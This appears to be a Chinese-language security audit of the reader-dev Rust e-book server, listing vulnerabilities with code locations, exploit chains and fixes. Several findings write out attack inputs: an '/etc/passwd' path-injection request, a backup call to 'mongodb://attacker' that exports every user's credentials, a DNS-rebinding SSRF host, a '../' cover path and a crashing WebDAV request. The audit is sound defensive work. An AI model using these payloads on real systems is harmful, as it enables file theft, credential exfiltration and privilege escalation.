# reader-dev 对抗性安全审计报告

对 `warpdotsys/reader-dev` master 分支的全量对抗性审计。6 个方向并行审查（解析引擎 / 爬虫网络 / 鉴权路由 / 存储迁移 / 文件穿越 / 业务逻辑），全部发现由主审逐条对照源码复核。

**核实标记**：
- ✅**实测** = 在本地运行的服务上端到端复现
- ✅**核实** = 对照真实源码确认逻辑成立
- ⚠️**待验** = 代理报告、逻辑合理但未逐行复核（置信度中）

前置说明：多数越权类问题在 **secure（多用户）模式**下才有跨租户影响；非 secure 单用户模式下部分降级为「任意人可读本机文件」。panic 类与业务逻辑类不分模式。

## Critical（立即修）

### C1. OPDS 任意文件读取 — `resolve_storage_file` 无路径校验　✅**实测**
`src/api/opds.rs:326`（`download`/`acquire` 触发）
`resolve_storage_file` 直接 `storage_dir.join(book_url.trim_start_matches("storage/"))` 后只判 `is_file()`，**无 canonicalize、无容器校验**。而 `router.rs:10456 resolve_loc_book_file` / `router.rs:10366 resolve_storage_path` 都做了容器校验——OPDS 自带了一份未加固副本。
- **利用链（已实测）**：`saveBook {"bookUrl":"storage//etc/passwd","origin":"loc_book",...}`（saveBook 不校验 bookUrl；`storage/` 前缀使 `is_local_book`=true；`join` 遇绝对路径 `/etc/passwd` 直接覆盖）→ `GET /opds/download/<base64url(bookUrl)>` **返回 `/etc/passwd` 全文**。
- **影响**：突破宿主文件系统边界。任一注册用户（非 secure 模式匿名）读取服务进程可访问的任意文件——`reader.db`（全部用户数据+凭据）、他人 storage、密钥、`/etc/passwd`。
- **修复**：`resolve_storage_file` 复用 canonicalize + `starts_with(storage_dir)` 校验；`saveBook` 对 `bookUrl` 做基本合法性校验（拒绝 `..`/绝对路径注入）。

### C2. MongoDB 备份/恢复 — 跨租户数据+凭据外泄 & 提权　✅**核实**（两个方向独立命中）
`src/api/router.rs:6714 backup_to_mongodb` / `:6749 restore_from_mongodb`；`src/service/mongodb_backup.rs:139/143/184`；`src/model/user.rs:9-12`
两个 handler 把 `resolve_namespace` 返回值**丢弃**（仅当登录检查），实际用客户端传入的 `ns`；`uri` 也客户端可控；**无 admin / secureKey 校验**（对比 `clear_inactive_users:6037` 有管理员门槛）。
- `backup_one`（:143 单 ns 路径 `include_users=true`）把 `users` 整表写远端；`User` 的 `password`/`salt`/`token` **无 `#[serde(skip)]`** → 全部用户的密码哈希+盐+会话 token 外泄。
- **利用**：任一登录用户 `POST backupToMongodb {"uri":"mongodb://attacker","ns":"<自己>"}` → 导出全部用户凭据；`POST restoreFromMongodb` 用预置的 `is_admin=true` 文档覆盖/新建管理员 → **提权+全库篡改**。
- **修复**：两 handler 加 admin/secureKey 门槛；只用 token 派生的 ns（普通用户仅备份自己）；`uri` 限定为环境变量或白名单；`users` 备份剥离 `password`/`salt`/`token`（对齐 zip 备份「users 不入包」策略）。

## High

### H1. 搜索词含 `>...<` 触发 slice panic → 全源静默零结果　✅**实测**
`src/service/search.rs:81`
`build_search_url` 用 `find('<')`/`find('>')` 各取第一个位置、不校验顺序：`&url[start+1..end]` 当 `start>end` 时 panic。`{{key}}` 是用户搜索原文字面替换。
- **实测**：搜索 `>abc<` → 12 处 `search.rs:81` panic（每个用 `{{key}}` 的书源各一次），HTTP 200 但结果全空。用户搜任何含尖括号的词 → 全源搜不到 + 日志刷屏。全仓库**无 CatchPanicLayer**。
- **修复**：`if let (Some(s),Some(e))=(find('<'),find('>')) { if s<e {...} }`；建议全局加 `tower_http::catch_panic::CatchPanicLayer`。

### H2. `/epub`、`/book-assets`、`/assets` 静态服务无鉴权 → 跨租户读书籍内容　✅**核实**
`src/api/router.rs:84,90-91` 路由；`:11021 serve_data_file`
`serve_data_file` 只防路径穿越，**无 token 校验**。磁盘按 `storage/data/{namespace}/...` 分目录，URL 首段即 namespace。
- secure 模式匿名 `GET /epub/<别人用户名>/<书名_作者>/index/*.xhtml` 直接读他人书籍正文；`/assets/<别人ns>/...` 读上传资产。
- **修复**：这三条路由加鉴权层，校验 URL 首段 namespace == 当前用户（admin 例外）；或改签名临时 URL。

### H3. 爬虫 DNS rebinding SSRF — 校验的 IP 未绑定连接　✅**核实**
`src/service/crawler.rs:461`(校验) vs `:509`(连接)；`build_http_client` 无自定义 resolver，Cargo.toml reqwest 未启用 hickory-dns
`validate_public_target` 解析一次 DNS 校验，随后把 **hostname 字符串**交给 reqwest，reqwest 连接时**重新解析**——校验 IP 从未绑定 socket。
- **利用**：恶意书源 `http://rebind.attacker.com`（TTL=0，首解析返公网 IP 过校验、连接时解析成 `169.254.169.254`/`127.0.0.1`）→ 打云元数据/内网。POST、图片代理、RSS 恒走直连 reqwest。
- **修复**：解析一次、校验每个 IP、`resolve_to_addrs(host, &[验证过的IP])` 把 IP 钉死到连接；重定向目标同理。

### H4. 爬虫无响应体上限 → 解压炸弹 OOM　✅**核实**
`src/service/crawler.rs:530`
reqwest 开了 gzip/brotli/deflate，`fetch_once` `resp.bytes()` 无大小上限——1MB 压缩包可膨胀成数 GB。图片路径 `fetch_image` 反而有上限（`content_length` 预检+流式累计），主抓取路径漏了。
- **修复**：主路径同样流式+字节上限（镜像 `fetch_image`），加 `READER_HTTP_MAX_BYTES`。

### H5. 本地书章节写入丢失 `user_namespace` → secure 模式本地书正文读不出　✅**核实**
写入 `src/storage/mod.rs:3659`（save_local_book）、`:2029`（save_chapters）、`:3835`（replace_chapters）、`:3705`（migrate_loc_book）均**未绑定 user_namespace**（列默认 `'default'`）；读取 `get_chapter_content:2088` 按 ns 过滤。
- secure 模式（ns=用户名）上传本地书 → 目录能显示（`list_chapters_with_word_count:2072` 无 ns 过滤），点章节 `get_chapter_content` 命中 0 行 → 「章节不存在」/空。导出同理。
- **修复**：四处 INSERT 显式绑定 `user_namespace=ns`；旧库一次性回填。

### H6. `resolve_get` 对畸形 `@get:` panic　✅**核实**
`src/parser/rule.rs:529`
`rule[after+1..after+end_rel]` 假设 `@get:` 后紧跟单字节 `{`。`@get:}` → `rule[6..5]` 越界 panic；`@get:中}` → 切进多字节字符 panic。书源规则不可信 → 恶意/损坏书源可 panic 请求。
- **修复**：校验 `{` 存在与 `is_char_boundary`；畸形则原样输出文本（同 `@put` 的 `split_put`）。

### H7. 目录/详情/正文「解析空 → isSuccess:true 空结果」静默失败簇　✅**核实**
- 目录 `book.rs:579,598` + `router.rs:3556`：`chapterList` 缺失直接 break、`toc_items` 未命中 → `Ok(vec![])`，router 不区分空/非空。
- 正文 `router.rs:3899`：文本分支未判空（漫画分支 `:3798` 判了）→ 空正文返回成功，还顺带推进进度。
- 详情 `router.rs:3391`：`info.name` 为空仍成功并写 10min 进程缓存（`searchBookSource:2679` 判了空、getBookInfo 没判）→ 详情页空白且缓存毒化 10 分钟。
- 这是我上次修复的 bug 链**同型残留**：规则失效 = 用户看到「未获取到章节目录/空白页」而非真实错误，日志无 error。
- **修复**：三处补「空=错误」判定（对齐 legado `TocEmptyException`），失败不入缓存/不存进度。

### H8. `read_local_cover` 任意文件读取（写入生成的 EPUB）　⚠️**待验**
`src/service/local_sync.rs:625`
只前缀匹配 `{ns}/covers/`，未拒 `..`、未 canonicalize（对比 `book_cover_bytes:4200` 检查了 `contains("..")`）。`cover_url` 客户端经 saveBook 可控，`coverUrl="/assets/default/covers/../../../../etc/passwd"` 保持前缀绕过 → 后台双轨同步 `generate_epub_for_book` 把该文件读入 EPUB → OPDS 下载取回。
- **修复**：同 `book_cover_bytes` 拒绝 `..` 或 canonicalize 后校验容器。

### H9. 翻页无去重/环检测 → 正文重复拼接、目录抓 20 次；nextUrl 用 init 前文档致多页截断　⚠️**待验**
`src/service/book.rs:616-636`（toc）、`:1157-1177`（content）
- 只判 `next.is_empty()` break，无 legado 的 `nextUrlList` 去重、不比较 `next==current`。站点最后一页「下一页」指向自身 → 正文被拼接多遍（用户看到重复正文）、目录同页抓 20 次（慢+可能被封 IP）。
- next 规则在 **init/preUpdateJs 之前**的原始 body 上求值（`page_body` vs 章节用的 `page_html`）→ 用 init 的 JSON/加密源多页目录/正文只取第一页（静默截断）。
- **修复**：`visited:HashSet` 去重（初始放入起始 URL）；next 规则改用 init 后文档求值。

## Medium

### M1. XPath 规则遇非良构 HTML 静默返回空　⚠️**待验**
`src/parser/xpath.rs:18` — sxd 是严格 XML 解析器，真实 HTML（void 元素/未闭合/未引号属性）解析失败即 `vec![]`。legado `@XPath:` 走 HTML 容错的 JsoupXpath，大量合法 `@XPath:` 规则在此返回空 → 「未获取到章节目录」。模块自带测试 `xpath_non_wellformed_html_returns_empty` 把该行为断言为「预期」。
- **修复**：先用 html5ever/scraper 归一化为良构 XHTML 再交 sxd。

### M2. `setBookSource` 预取空目录也写缓存 → 换源后 5 分钟内目录空且重试无效　✅**核实**
`src/api/router.rs:3202`（缺 `is_empty` 守卫，正是 getBookToc:3559 已补的那道防护）。换源到暂时失效的源 → 空目录进缓存 → TTL 内 `getBookToc` 恒命中空缓存。
- **修复**：加 `if !chapters.is_empty()`，与 3559 一致。

### M3. 换源不重定位阅读进度 → 跳到错误章节　⚠️**待验**
`src/api/router.rs:3163`；`storage/mod.rs:2297`。`switch_book_source` 只改 origin/url/toc_url，`dur_chapter_index` 原样保留。setBookSource 已抓下新目录（:3192），可按 `dur_chapter_title` 重定位，修复成本极低。

### M4. `percent_decode` 非 UTF-8 边界 panic（两处，未认证 DoS）　✅**核实**
`src/api/webdav.rs:138`（`resolve_path`/PROPFIND/MOVE 均调用，非 secure 免认证）、`src/service/explore.rs:198`。`&s[i+1..i+3]` 字节切片，`%` 后接 3 字节 CJK（`中`=E4B8AD）→ `i+3` 落字符内部 panic。`PROPFIND /reader3/webdav/%中` 即触发。
- **修复**：先判 `is_char_boundary(i+3)` 且两位 ASCII hex，否则原样输出 `%`。

### M5. toc 缓存键 book_url/toc_url 混用 → 进度回写/章节绑定/越界校验失效　⚠️**待验**
写入 `router.rs:3563 cache_toc(ns,toc_url,toc_url,..)`；4 处读取（`:3952`进度回写、`:3994`章节绑定、`:7958`越界校验、`:9061`index反查）传的却是 `book_url`。`tocUrl!=bookUrl`（有独立目录页的源，多数）时恒未命中 → 读完章节名不更新、`chapter.index`/`nextChapterUrl` 拿到 undefined 正文错乱、越界保护失效。`switch_book_source` 的缓存清理语句也因此删不到行。
- **修复**：toc 缓存键统一为 `(ns, book_url)`。

### M6. 缓存/删除跨 namespace 过量删除　⚠️**待验**
`storage/mod.rs:2174/2930/2282/2145/2827` 的 DELETE 用 `book_url IN (SELECT ... WHERE ns=?)`，不按缓存表自身 `user_namespace` 过滤（注释「无 ns 列」已过时，P0 后两表都加了 ns）。用户 A 删同源书会删掉用户 B 同 book_url 的正文/目录缓存。
- **修复**：直接 `WHERE book_url=?1 AND user_namespace=?2`。

### M7. `analyze_media_url` 规则未命中回退章节页 URL（回退泄漏）　⚠️**待验**

- **修复**：区分「无规则（直链，保留回退）」与「有规则未命中（报错）」。

### M8. 探索 `bookUrlPattern` 命中用未拼 base/未去后缀的 URL　⚠️**待验**

### M10. `expand_embedded_impl` `{{}}` 展开无迭代上限 → 自引用数据死循环　⚠️**待验**

### M12. `split_combined` 二次 `&&`/`||`/`%%` 切分忽略括号平衡　⚠️**待验**

### M13. 源书正文缓存无 TTL/无上限 + 缓存非空坏数据　⚠️**待验**

## 已复核为「无问题」的点（避免重复排查）
- SQL 注入：所有 `format!` 拼进 SQL 的表/列名均来自硬编码白名单，ns/排序/where 值走参数绑定——未发现用户可控拼接。
- Zip-slip（EPUB/CBZ/DOCX/备份）：`is_safe_zip_entry_path` 拒绝绝对/盘符/`..`；归档炸弹有 `MAX_ZIP_ENTRY_BYTES`/`MAX_CBZ_TOTAL_BYTES`/`PDF_MAX_PAGES` 防护。
- 数字/十六进制 IPv4（`2130706433`/`0x7f..`）：url crate 归一化，非 SSRF 绕过点。
- WAL/连接池、`ct_eq` 常量时间实现、argon2id 密码哈希、db_backup 原子性、迁移幂等（目标非空即跳过+原文保底）、索引区间解析、正则回溯限制、JSONPath 深度限制、`{{}}` 展开的 depth cap——均正确。

## 建议修复优先级
